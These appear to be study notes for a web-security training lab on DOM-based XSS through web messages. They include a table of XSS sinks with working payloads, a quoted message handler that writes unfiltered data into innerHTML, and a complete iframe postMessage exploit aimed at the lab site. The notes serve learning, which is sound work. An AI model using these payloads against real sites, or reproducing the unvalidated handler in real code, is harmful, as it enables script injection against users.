Sink's type            What it does                                                   In code                   Working payload    
HTML Sink              It interprets the text as HTML and draws it.                   element.innerHTML         <img src=x onerror=...>
Execution Sink         It runs the text directly as JavaScript code.                  eval(data)                alert(1)
URL/Navigation Sink    Opens or navigates to a new web address.                       location.href             javascript:alert(1)
Attribute Sink         Overwrites an existing element's property (e.g. src, href).    element.src = data        javascript:alert(1)




Task 1:
///Lab: DOM XSS using web messages///

Dom based weaknesses means the communication between two webpage i not correctly filtered, or not filtered at all. In the page's source there are these lines:

                        window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;
                        })
As we can see there is no filter at all (like event.origin). So if this webpage get any data from another (probably malicious) webserver, it will runs it automatically.
So our exploit server will send a message to the webapp, it will get into the innerHTML (without any filter) and runs automatically (HTML sink)
<iframe src="https://0ad500a104d17e9e800508f8002b00d9.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=print()>', '*')"></iframe>

